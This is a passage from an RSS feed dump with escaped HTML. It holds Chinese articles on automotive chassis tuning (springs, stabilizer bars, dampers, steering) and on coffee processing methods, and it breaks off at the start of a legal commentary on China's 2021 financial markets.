data-pid=\"dCEICggx\">调校基本要求如下：</p>\n<p data-pid=\"zAZuf2Y2\">①试验车辆的准备及检查：轮胎气压与定位参数达到设计状态，整车姿态与</p>\n<p data-pid=\"0vcXrFGg\">设计目标一致、整车状态良好； </p>\n<p data-pid=\"fRANNNCT\">②试验场地：普通公路、高速公路、蛇形路面、坏路路面、山区路面、操控</p>\n<p data-pid=\"mfQb2g0U\">跑道、动态试验广场，因调校本身具有危险性，所以要求以上路面无行人； </p>\n<p data-pid=\"j5BcEdv9\">③载荷：整备质量+1驾驶者+1-2 乘客，满载；</p>\n<p data-pid=\"hxhSRbZY\">在调校的过程中，会有针对性的对零部件进行更换调整，然后根据评价结果做出相应的记录。</p>\n<p><br></p>\n<ol><li data-pid=\"LyK6rOg6\"><b>悬架弹簧的调校 </b></li></ol>\n<p data-pid=\"O42cy2Oi\">汽车是一个复杂的多自由度振动系统，总布置设计时会将汽车质量分配系数设计在1附近，这样前、后悬架的振动就可以相互不影响，也叫解耦。经过简化可将前后悬分别看作是单质量的振动系统，见图4，频率公式为（1）式。                          </p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-147a66ddd84c53882871ff8a659658fd_720w.jpg?rss\" data-caption=\"图4 频率公示\" data-size=\"normal\" data-rawwidth=\"763\" data-rawheight=\"278\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<p data-pid=\"LBvkLxYz\">车身振动频率<i>f0</i>设计值一般与人体走动时的振动频率接近，为了获得更好的舒适性，可适当降低前、后悬架的刚度，使前、后偏频小于1。但悬架刚度减小会使悬架的静挠度过大，悬架的运动行程有限，悬架偏频不能降低过多。悬架设计时会采用如多体动力学软件 ADAMS 进行模拟分析，确定得到前后弹簧刚度，再通过主观评价方法对前后弹簧的匹配方案进行测试，让车辆在行驶过程中拥有平衡良好的前后悬架。</p>\n<ol><li data-pid=\"YHBxYmny\"><b>横向稳定杆的调校</b></li></ol>\n<p data-pid=\"Z5IZFDGe\">汽车转弯行驶时车身侧倾严重，或通过 K&amp;C 试验发现某车的侧倾刚度较小时，需要对侧倾刚度进行调校。提高汽车侧倾刚度多采用增设横向稳定杆来实现。横向稳定杆又称防倾杆，是汽车悬架中的一种辅助弹性元件。它的作用是防止车身在转弯时发生过大的横向侧倾。横向稳定杆是用弹簧钢制成的扭杆弹簧，形状呈“U”形，横置在汽车的前端和后端，如图5所示。杆身的中部，用套筒与车架铰接，杆的两端分别固定在左右悬架上。当车身只作垂直运动时，两侧悬架变形相同，横向稳定杆不起作用。当车身侧倾时，两侧悬架跳动不一致，横向稳定杆发生扭转，杆身的弹力成为继续侧倾的阻力，起到横向稳定的作用。  </p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-4c2fe7994f5723d6ec351e5c6973c361_720w.jpeg?rss\" data-caption=\"图5 汽车横向稳定杆\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"623\" data-watermark=\"watermark\" data-original-src=\"v2-4c2fe7994f5723d6ec351e5c6973c361\" data-watermark-src=\"v2-a3a81f9f765167580c040aa1060c835b\" data-private-watermark-src=\"\"></p>\n<p data-pid=\"XnsWv2LD\">弹簧刚度选定后，进行稳定杆的匹配。选定稳定杆要根据车型前期的目标设定和调校风格进行选择，太粗的稳定杆，能提供很好的侧倾控制，但是会带来平顺性的恶化和更大的<b>转向不足</b>，选择合适的稳定杆和稳定杆衬套，既能让车辆的侧倾控制合理，又能保证车辆的响应性和较好的平顺性。</p>\n<p><br></p>\n<ol><li data-pid=\"E9dQwewB\"><b>减振器阻尼调校</b></li></ol>\n<p data-pid=\"JzxG1M87\">减振器调校在整个底盘调校的过程中是最为关键，是对提升整个底盘的品质感影响最重要的调校要素。项目开发初期，根据车型底盘调校属性目标，首先确定阀系类型，不同的阀系结构对性能的影响较大。减振器调校主要调校活塞和底阀的阻尼孔、阀片、节流片开口面积、补偿阀片。不同的阀系组合，即便是相同的阻尼力也会有不同的乘车体验。主要影响车辆的初始侧倾控制、中心区响应、路面的过滤能力、小激励的柔和感；中速一般指的是 0.1-0.6m/s，主要影响中等冲击的衰减控制、非中心区车辆响应、车身姿态控制；高速一般指的是 0.6-1.5m/s，该速度段主要影响大冲击的隔离感、车身受到大激励时车身的控制、极限操稳时车身姿态的控制。 </p>\n<p><img src=\"https://pic4.zhimg.com/v2-7194cb352fc5a7c828d7d35dc4d0f92b_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"600\" data-rawheight=\"600\" data-watermark=\"watermark\" data-original-src=\"v2-7194cb352fc5a7c828d7d35dc4d0f92b\" data-watermark-src=\"v2-14b59cbda99f773a74ba67fbbceb40de\" data-private-watermark-src=\"\" data-qrcode-action=\"none\" data-tags=\"qrcode\"></p>\n<p data-pid=\"LYCt67U2\">减振器调校则相对比较复杂，由于其运动速度范围较大（一般为 0.05m/s～ 1.5m/s），每个速度段都影响到相应的性能。比如，对于悬架舒适性，低速段阻尼力控制车身姿态，中速段阻尼力影响次级舒适性，高速段阻尼力决定大冲击感。而对于操控性，中低速阻尼力影响紧急变线时的侧倾支撑感，同时也影响转向中心感等，</p>\n<ol><li data-pid=\"fQm0t-oI\"><b>缓冲块和衬套的调校</b></li></ol>\n<p data-pid=\"R4A4a1hX\">例如某车后悬架的冲击舒适性较差，这时就需要考虑弹簧与缓冲块的合理匹配。采用延长缓冲块作用时间可以避免频繁地触碰缓冲块，或减小缓冲块刚度以避免接触时带来的突变感。可从缓冲块长度及刚度特性曲线着手，制定后悬架缓冲块方案。也可通过仿真对该车后悬冲击舒适性灵敏度进行分析，如发现后纵臂安装轴套及后副车架安装轴套对振动加速度影响较大，可改变各轴套等的纵向、垂向静刚度进行性能的调校。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-3218c4552be195af30b736de978a72a3_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"900\" data-rawheight=\"570\" data-watermark=\"watermark\" data-original-src=\"v2-3218c4552be195af30b736de978a72a3\" data-watermark-src=\"v2-5bf862107833d405ae3da3d324e824cc\" data-private-watermark-src=\"\"></p>\n<ol><li data-pid=\"ePdjNJeq\"><b>转向系统的调校</b></li></ol>\n<p data-pid=\"6WUducHe\">   电动助力转向系统（EPS）的调校过程主要是对软件各部分进行匹配调校。例如，通过对EPS基础助力、回正、阻尼以及转动惯量参数的匹配调校，使转向性</p>\n<p data-pid=\"nfH-_84e\">能达到低速轻便、高速稳重的感觉。这里尤其要关注转向机和电动机摩擦力大小，其对转向的手感会产生较大的影响，所以系统内摩擦需控制在一个较低的范围，才能给用户一个好的转向手感。</p>\n<p data-pid=\"g3NlNwt7\">    转向系统还可能出现左右转向力不对称问题、转向力增长不均匀问题、大转角下转向力偏大、转向与悬架干涉等问题。可采取选择合适的转向机、改变转向系设计硬点、合理匹配转向柱 2个万向节相位角、改变动力转向泵的设计油压等措施进行调校。</p>\n<p><br></p>\n<p data-pid=\"PHZ-ljHG\"><b>结束语：</b></p>\n<p data-pid=\"83lyCm0b\">底盘调校包含：悬架弹簧调校、稳定杆的调校、橡胶衬套的调校、前后缓冲块的调校、减振器调校、转向系的调校等。底盘调校过程是一个多种部件多种性能互相平衡的一个过程，调校的过程中需综合考虑车型的风格定位及操稳、平顺性能的平衡。 </p>\n<p><br></p>\n<p><br></p>\n<p data-pid=\"tdfrWB3D\">参考文献</p>\n<ol>\n<li data-pid=\"7zjH2nIr\">余志生. 汽车理论. 机械工业出版社. 2018.9</li>\n<li data-pid=\"ivz-XVU4\">沙雷等. 某轿车操纵稳定性及舒适性底盘调校方法研究.中国汽车</li>\n<li data-pid=\"1Oeqxwmk\">梁阿南. 车辆底盘性能调校分析.汽车工艺师.2021.9</li>\n</ol>\n<hr>\n<p data-pid=\"aGYdxWEG\"><b><i>记得关注我新开的专栏，每周会更新汽车类相关知识～～</i></b></p>\n<p></p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/green-49-75?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">Green</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/55773317/answer/2338442256?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">56 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/29897014?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">为什么绝少听说自主品牌参加汽车比赛的消息？</a><br><a href=\"http://www.zhihu.com/question/38176807?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">「好开」的车是什么样的？</a><br>\n","link":"http://www.zhihu.com/question/55773317/answer/2338442256?utm_campaign=rss&utm_medium=rss&utm_source=rss&utm_content=title"},{"title":"日晒、水洗、蜜处理……这些咖啡处理工艺，到底都是什么意思？","date":"2022-02-15 06:05:07","description":"\n<p>咖啡风味除了被品种、产地、种植方式影响外，还有一个重要的过程——采收处理。不同的处理方法会引导出不同的风味，我们就来聊聊咖啡处理法对风味的影响。</p>\n<h2>咖啡采收</h2>\n<p>咖啡果实，因为形似樱桃，又被称为「咖啡樱桃」。咖啡在采收时，原则上应该采摘全红果实。咖啡果实红透了，说明真正熟透了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/01/27/article/4551931aefd7d41a6f6759ed0d25531a\"></figure><p>咖啡成熟后一般有两种采收方式：</p>\n<ul><li>人工采收：咖农背着框，手工采摘咖啡果实。这种方式速度慢，成本高（相对来说，但很多咖啡产地人工成本非常低），但采摘品质可保证。</li></ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/01/27/article/47b45a34fe19f2c96594ef4cfe5a7545\"><figcaption>哥伦比亚手工采收</figcaption></figure><ul><li>机械采收：用自动化收割机械进行采收，这种方式成本低，速度快。因为机器没有筛选机制，一切照单全收，导致采摘品质参差不齐。</li></ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/01/27/article/9751700aaeb173140b60a43430a3ea79\"><figcaption>巴西机械采收</figcaption></figure><p>采摘后，我们就得到了咖啡果实，下图是一张咖啡结构图，我们喝到的咖啡其实是最后一层种子，也就是咖啡豆。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/01/27/article/b4707fb22637aa1ac9778ba3defa2838\"></figure><p>而为了得到最后一层采取的处理措施，被称为「处理法」。</p>\n<p>目前三种最原始的处理法是：日晒法、水洗法、蜜处理法。这三种处理法都是通过自然界中的条件来进行处理，是最早的咖啡处理手法。</p>\n<p>即便现在出现了各式各样的新兴处理法，但这些处理法，还是在传统处理法的基础上发展而来，那我们就来看看，这三种基础的处理法，到底给咖啡生豆带来了什么？</p>\n<h2>传统处理法</h2>\n<h3>日晒法（<strong>Natural</strong>）</h3>\n<p>日晒法是最古老，最原始的一种处理方法。顾名思义，就是将咖啡果实直接放在太阳底下暴晒 2–4 周。一般多在干燥、日照充足的国家使用。如果某些湿度比较大，光照条件不好的国家使用此方法，多半会借助干燥机帮助完成干燥的过程。</p>\n<h4>处理步骤</h4>\n<p><strong>分拣，</strong>分拣有两种方法：</p>\n<ul><li>手工：将采摘后的咖啡果实铺在架子上，人工将未成熟、坏果、树枝、树叶等杂物进行手工摘除。</li></ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/01/27/article/60e80c08682ac985d6510c1d027eaff4\"></figure><ul><li>沉池：将咖啡果实放在蓄水池中，成熟饱满的咖啡果实会沉在水底，未成熟的果实、树枝、树叶会浮在水面，直接将这些杂物清除即可完成初步分拣。</li></ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/01/27/article/594067282279cbfa6b127b43085d9920\"></figure><p><strong>晾晒，</strong>将分拣完的咖啡果实直接放在太阳下晾晒。这里也分为两种方法：</p>\n<ul>\n<li>地面晾晒：最简单的将咖啡果实直接铺在平地上，这是最早的晾晒方式。好处是简单、方便；缺点是直接与地面接触，会有一些豆子因为发酵过度或者晾晒不彻底而发霉、变质。有的还会沾上小动物的粪便等等。</li>\n<li>架晒：放在有纱网的架子上进行晾晒。好处是可以避免大量灰尘、动物粪便、尿液污染，纱网提供了全方位的通风条件，避免了发霉、变质的可能。</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/01/27/article/a61c45e7d14363c04a3b792740d1549b\"></figure><p>将咖啡果实均匀的铺在曝晒场之中，且每日需翻动数次。这个过程通常持续 2~4 周左右，依当地气候而定，在咖啡豆内部的含水量降至 10~12% 时，即完成日晒的步骤。</p>\n<p><strong>脱壳：</strong>经过 2~4 周的晾晒，使得果皮变干、变硬，这时就可以使用脱壳机脱去外壳，取得咖啡豆。</p>\n<p><strong>分级：</strong>咖啡豆收走后，将会进行产地内的一次生豆分级，也就是上篇内容中提到过的分级标准。然后就可以装袋等待销售了。</p>\n<h4>风味</h4>\n<p>日晒豆颜色偏黄，豆体易出现缺角（打壳机造成的）。在干燥过程中会吸收咖啡果肉中的果糖精华，因此果香浓郁，甜度也高，醇厚度也略高于水洗或蜜处理；干净度和明亮度逊于半水洗和水洗。</p>\n<h3>水洗法（Washed）</h3>\n<p>在 18 世纪，由荷兰人发明了水洗法。这种方法特别适合常见下雨、湿度又高，无法进行日晒的国家。目前这项技术被广泛应用，与日晒法最大的不同就是利用发酵来去除果胶层。</p>\n<h3>处理步骤</h3>\n<p><strong>分拣：</strong>此处分拣，直接使用沉池的方法用水进行筛选</p>\n<p><strong>脱果皮与果肉：</strong>筛选好的咖啡果实，放入果肉筛除机中，将果皮与果肉脱离，留下咖啡豆。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/01/27/article/465c8513fc94de79baa2c50722d8422c\"></figure><p><strong>发酵：</strong>这个步骤的目的是要利用生物处理的方法，将果胶去除。将经过果肉筛除机处理的咖啡果实，放入发酵槽 16~36 小时，发酵菌会溶解掉果胶。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/01/27/article/3a26a67a7609473581bf5a1d1c6a8c4b\"></figure><p><strong>水洗：</strong>在完成发酵、去除果胶后，由于发酵菌与杂质会残留在咖啡豆上，因此会再清洗一次咖啡豆。为了要清洗干净，这一步骤会消耗大量的清水。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/01/27/article/9b764242a539ef7db61596884e7ce3a2\"></figure><p><strong>干燥去除羊皮层、银皮：</strong>通常会利用机器（或晒干）将咖啡果实烘干，让水分含量降到 10~14%。接着利用脱壳机去除剩余的内果皮与银皮，即完成加工处理。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/01/27/article/80931cd45c00c01e515a6649b03be704\"></figure><p>利用水洗法处理的咖啡豆干净杂质少，因为果实中的果肉很早被洗掉，所以不用担心发霉问题，豆子整体更干净，品质比较稳定。</p>\n<p>但水洗法非常废水，成本比日晒高一些，因此只有水资源非常丰富的地方才会用此法。</p>\n<h4>风味</h4>\n<p>水洗豆酸质更佳明亮，清爽，口感干净，醇厚度略低于日晒。</p>\n<h3>蜜处理（Honey）</h3>\n<p>蜜处理这种处理法，目前在中美洲极为流行，其中哥斯达黎加比例更高一些。由于咖啡豆表层粘膜极为粘滑且糖度极高，因此人们通常称之为「蜜」。在蜜处理过程中，咖啡在干燥时会留有部分或全部的「蜜」。咖啡果实经采摘、分级和去果肉果皮，便会被放在干燥床上进行干燥。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/01/27/article/68582e89dff680f5721b714c18bf3a41\"></figure><p><strong>分拣：</strong>方法同日晒法所用的沉池法筛选成熟的咖啡果实。</p>\n<p><strong>去除果皮与果肉（同水洗法）：</strong>透过果肉筛除机（pulping machine），将咖啡果实的外果皮与果肉去除（会留下果胶、内果皮与银皮）。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/01/27/article/56218175a7137c4b03c78225edf624c0\"></figure><p><strong>日晒：</strong>将带有果胶的咖啡豆，铺在曝晒场直接进行曝晒，使含水量降到 10~14%。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/01/27/article/d752e9757b7c15b2196916142a2e23df\"></figure><p>由于粘膜的干燥时间很短，因此在干燥过程中咖啡豆几乎不会发生发酵。用这种处理方法加工的咖啡豆酸度要比自然水洗法略高一些，但比水洗法和自然日晒法加工要低很多。</p>\n<p>而蜜处理与其他两种处理法最大的不同在于蜜处理会根据发酵程度，再细分为以下几种：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/01/27/article/b3483771f4d2b05b6f3ee5d776143ad3\"></figure><ul>\n<li>\n<strong>白蜜：</strong>去除 80% 果胶，比较接近水洗的感觉。目前不太多见，了解一下即可。</li>\n<li>\n<strong>黄蜜：</strong>去除 40% 左右的果胶，直接用光照来干燥，持续8天左右使水分含量达到稳定值。</li>\n<li>\n<strong>红蜜：</strong>去除 25% 左右的果胶，因为保留的果胶更多，所以需要更多的时间来脱水，同时减少阳光直接曝晒的时间，有的地方也会用到遮光布，大约会用到12天左右。</li>\n<li>\n<strong>黑蜜：</strong>几乎没有去除果胶，果胶更厚，大约会用到 20-25 天的时间来干燥脱水。</li>\n</ul>\n<h4>风味</h4>\n<ul>\n<li>黄蜜：相对温和的果香，最接近水洗咖啡的感觉</li>\n<li>红蜜：有较明显的果香与甜感，以及类似糖浆口感的醇厚度。</li>\n<li>黑蜜：发酵度很高，带有酒香，绵密的口感，接近日晒的口感。</li>\n</ul>\n<h3>湿刨法（Wet-Hulling）</h3>\n<p>湿刨法其实更带有产地特色，不是一种普世的处理方法。但它处理方式相对传统，因此我将它归纳为传统处理法。</p>\n<p>印度尼西亚苏门答腊和曼特宁咖啡的产生是不可分割的。苏门答腊岛的气候潮湿，而传统三大处理方法对于日照条件要求都十分之高。于是，当地的咖啡制造者因地制宜，发明了这种独特的制作方法。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/01/27/article/3b2b9d93c9dac772b3424b85b0e44803\"></figure><p>湿刨法与水洗方式的杯测风味截然不同。因为羊皮纸壳和生豆之间存在着相当大的空间差距，所以咖农在生豆第一次干燥达到 30–35% 的含水量时，就卖给当地收购湿羊皮外壳生豆的回收站。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/01/27/article/592c416807b5a965f12c14987d45ef8b\"></figure><p>然后再过几天，将含水率降至 12–13%，即可收获储存。</p>\n<p>通过湿刨法处理的曼特宁，低酸、低甜、高醇厚度，口感十分浓郁。焦糖与果香味明显，甚至带有药草或青草香气以及木质的气味。</p>\n<h2>新兴处理法</h2>\n<h3>厌氧发酵处理（Anaerobic Fermentation）</h3>\n<p>厌氧处理法，可谓在新兴处理法中发展势头最盛。现在各种花哨的厌氧处理方式。其最早是在 2015 年的 WBC（世界咖啡师大赛）比赛中，由澳大利亚选手 Sasa Sestic 带来的一款哥伦比亚云层庄园的咖啡豆，一举夺冠。而到了 2018 年，比赛前 6 名有 5 名使用了厌氧发酵处理的豆子，可见厌氧处理的独特魅力。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/01/27/article/9915aebb157d9729b57f241c262669c9\"><figcaption>图源：2015 年 WBC 决赛 Sasa Sestic 比赛视频</figcaption></figure><p>厌氧发酵处理法，其实源自于红酒的制程之一。这种处理法的特点：</p>\n<ul>\n<li>必须要有个可监控的完全封闭的不透明容器；</li>\n<li>再对容器进行密封，发酵其实是一种将糖转化成多种化合物产生酒精和二氧化碳的过程，进而使密封的容器中产生高压，而高压有利于种子吸收果胶中的风味物质；</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/01/27/article/182e5c474c14d3e3fd92e2cbe217e57b\"></figure><ul>\n<li>将容器放置在室内，并且对室内的温度要严格控制，控制温度和时间可以控制容器的发酵程度。</li>\n<li>最后是向容器持续注入二氧化碳，将氧气排出，在发酵过程中，PH 值是发酵过程中一个重要的参考指针，要严格控制温度与 PH 值的变化，当果胶与粘液中的糖分刚被完全消耗掉时，立即开封中止发酵，并马上在日光下进行干燥，避免过度发酵。</li>\n</ul>\n<p>厌氧发酵的核心是发酵过程、程度可控，可根据需求进行精确控制，而自然处理法发酵过程不可控在此技术的基础上，又诞生出了一些变化处理方式：</p>\n<p><strong>双重厌氧发酵：</strong>顾名思义，就是将发酵过程分成了 2 个阶段，每个阶段进行不同时长的发酵，突出不同的风味。</p>\n<p><strong>厌氧日晒：</strong>厌氧发酵过后，再拿出来晒。它的特点就是结合厌氧方式发酵的可控，与自然日晒发酵的不可控带来的口感变化。</p>\n<h3>二氧化碳浸渍（Carbonic maceration）</h3>\n<p>二氧化碳处理法（又称咖啡红酒处理法）灵感来源于红酒的酿造工艺。早在 1872 年，著名微生物学之父路易·巴斯德（Louis Pasteur）就发现，葡萄果实在空气中和在纯二氧化碳环境中的味道是不同的。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/01/27/article/093f64257da9748bdded0504dda61116\"><figcaption>图源：百度百科二氧化碳浸渍</figcaption></figure><p>酿酒师在采用二氧化碳浸渍法时，会将整串带梗的且未破皮的完整葡萄小心放在充满二氧化碳气体的密闭容器中。在正常情况下，葡萄细胞会消耗葡萄糖和氧气，进而释放二氧化碳、水和能量。但在充满二氧化碳的无氧环境中，葡萄细胞为了获得细胞所需要的能量，会迫使完整葡萄进行细胞内发酵，这样就会将葡萄糖直接转化为酒精、二氧化碳、能量以及许多芳香物质，而根据温度的不同，浸渍过程可能持续 1–3 周。当然，葡萄在无氧环境中进行厌氧代谢、发酵之后会自然破裂，当到达这一阶段时就可以进行传统发酵了。</p>\n<p><strong>目前可以把红酒处理法的种类分为：</strong></p>\n<ul>\n<li>醋酸发酵（Aerobic 有氧发酵）</li>\n<li>乳酸发酵（Anaerobuic 厌氧发酵）</li>\n<li>混合发酵（Mix Fermentation=Aerobic+Anaerobuic）</li>\n</ul>\n<p>而将此工艺在咖啡中使用，其实差不多，具体处理步骤大体如下：</p>\n<ul>\n<li>将咖啡豆去除果肉果皮后放入不锈钢容器里。不锈钢容器能更加保证干净的风味。接着控制不同的温度，影响反应的快慢。</li>\n<li>把不锈钢容器放到更容易控制温度的室内，他们发现如果需要豆子更复杂的酸，则就把温度控制在 4–8°C，而如果需要豆子有更高的甜度，则把温度就控制到 18–20°C。</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/01/27/article/e913f2722f920dbca71be9ee0faf1266\"></figure><ul>\n<li>把发酵桶密封起来，这样能发展出更多的芳香物。</li>\n<li>这是最关键和重要的一步。往发酵桶中加入二氧化碳，二氧化碳的密度比氧气大，从而挤压出空气。这样做让咖啡豆置于无氧环境，因为没有氧气，这就让咖啡豆果胶中的糖分分解速度减慢，同时 PH 值也会以比较慢的速度下降。</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/01/27/article/1e6be27bad2404abc899d593f1b9321a\"><figcaption>图源：sumiaproncoffee</figcaption></figure><p>在二氧化碳的帮助下，整个发酵过程在 22°C 下将延长 3 天，而如果温度更低的话，发酵的时间则可以更长。减少了干涩的口感和醋酸的味道。</p>\n<p>随着厌氧工艺可控的特性被发掘，现在很多咖农都喜欢在这一步加入一些「添加剂」。例如不同品种的果胶粘液或特定的酵母菌，以引入咖啡豆往不同风味中发展。这也是江湖中「香精豆」的一种来源。</p>\n<h3>酒桶发酵（Barrel Fermentation）</h3>\n<p>酒桶发酵也可以算是近几年比较火的一种处理法了。一般采用朗姆酒桶、威士忌酒桶、雪莉酒桶。主要是洪都拉斯在用这类处理法。而且也确实惊艳了不少人。</p>\n<p><strong>「雪莉桶」</strong>是威士忌行业中的雪莉酒厂用来做陈年的桶，雪利酒是一种著名的加强酒，产自西班牙南部阳光明媚的赫雷斯产区，雪利酒的酿造的过程中一定要经过索雷拉系统（Solera System）熟化这道工序。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/01/27/article/9b4deeaef68b843d5524e5f92256d269\"></figure><p>索雷拉系统本质上是指雪利酒加强之后，将不同年份的雪利酒混合陈酿的过程；在索雷拉系统中，所有的酒桶会根据年份层层迭放，最底层是年份最老的雪利酒，最上面则是最为年轻的雪利酒，每年会从最底部的酒桶中抽取部分酒液用于装瓶和销售，再从上一层的酒桶中抽取相应比例的酒液进行补充。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/01/27/article/6cd630effe444b138174f0231d99a370\"></figure><p>而精致水洗雪莉桶发酵法就是将采摘回来的咖啡樱桃先是进行精致水洗处理，水洗处理完之后把这些处理好的咖啡樱桃放进熟成过威士忌的雪莉酒桶中在 15–20℃ 左右的低温环境中发酵 30–40 天，然后再进行阴干晾晒；雪莉桶发酵处理法使得咖啡有惊艳的香气，浓稠的口感。</p>\n<h2>总结</h2>\n<p>咖啡处理法是大自然赋予咖啡的神奇变化，虽然现在各类特殊处理法大行其道，各种「添加」带来不少争议，但这些变化确实给消费者带来了更好入口，更好描述的一杯饮品，也侧面帮助我们更好的抓住了消费者的舌头。</p>\n<p>希望这篇内容让大家了解了咖啡处理法背后的一些故事，明白了处理法对咖啡带来的影响。处理法说完，咖啡豆就离开了初加工的环节，下一篇我们就来看看咖啡烘焙带给咖啡哪些不一样的变化吧。</p>\n<h4><strong>参考资料</strong></h4>\n<ul>\n<li><a href=\"https://www.youtube.com/watch?v=0JxPy7ioUe4\" target=\"_blank\">Coffee Processing Explained: What is a Natural Process Coffee? | Hasbean</a></li>\n<li><a href=\"https://www.youtube.com/watch?v=WaVrA926wNE&amp;t=47s\" target=\"_blank\">Coffee Processing Explained: What is Washed Coffee? | Hasbean</a></li>\n<li><a href=\"https://www.youtube.com/watch?v=k5iw31z1FAY&amp;t=10s\" target=\"_blank\">Honey Coffee Processing</a></li>\n<li><a href=\"https://www.youtube.com/watch?v=_Uitk1pqvls\" target=\"_blank\">湿刨法 Coffee Processing - Wet-HulledCoffee</a></li>\n<li><a href=\"https://www.youtube.com/watch?v=7jttyvyUGpI\" target=\"_blank\">Sasa Sestic - Final presentation WBC15</a></li>\n<li>巴西采收：<a href=\"https://www.youtube.com/watch?v=VtM9Doxw878&amp;t=66s\" target=\"_blank\">The Genuine Origin Coffee Project | Brazil</a>\n</li>\n</ul>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/71184"},{"title":"2021年金融市场观察与思考－法律视角","date":"2022-02-15 05:19:18","description":"\n<p data-pid=\"1CBvrp0m\">2021年，疫情还在继续，中国金融市场经历了许多大事件，真可谓百年未有之大变局。收到知乎寄来日历的时候，感慨一年时间转眼间就过去了。借年度交替之际，像以往那样，抽空写上一篇市场观察与思考。</p>\n<p data-pid=\"RyOB4sQF\">1. <b>证券市场法治建设急速前行。</b>从今年五洋债、康美药业等多起案件中都可以看出来，管理层加快相关法治建设的心态非常迫切。领导要求高，立法下猛药，司法出重手，导致许多案件当中中介机构要承担相当重的责任。会计师也就算了，毕竟在一线直接操作，连花瓶式的独董，也承担了上亿的责任，自然引发市场不少争议。责任这么重，相关的董责险并没有发挥应有的作用，又让人对中国保险市场有失信心。笔者觉得，真正的亮点在于对于实控人直接上了刑事责任。要知道，在中国民事司法中难以取证的问题，在刑事当中大都小事一桩。当这种追究刑事责任的情况越来越多后，证券市场相对而言会更加规范一些。至于证券欺诈民事责任的规则，也正在不断变化和完善之中。而且，追究民事责任，从原来的主板市场，慢慢扩大到新三板市场、债券市场、资产支持证券市场；从原来的处罚前置，到放弃处罚前置；从虚假陈述，会扩大到内幕交易、操纵市场。</p>\n<p data-pid=\"4WxxHg9T\">2. <b>中概股问题凸显。</b>今年的监管政策非常猛，以至于中概互联变成了中丐互怜，如果作时间的朋友，而不是作领导的朋友，大概率是没有及时逃出来，只能关灯吃面了。当然，猛药也是有副作用，所以2022年是否会纠偏，慢慢等着看。不过，中概股的问题还不止于此，还受中美两国关系影响。其实，中美证券方面存在一定的执法合作，在许多个案比如瑞幸案件中这种合作还是非常明显的，但是SEC以及PCAOB如果坚持要看审计底稿，那么在目前的环境下能否继续合作下去，还有待进一步观察。当然，也有可能不少上市公司会撤回来到香港上市，但相对而言，香港市场的规模较小，能不能容纳那么多家公司回来，能不能发挥同样的融资作用，还有待观察。</p>\n<p data-pid=\"Ux89oMZN\">3. 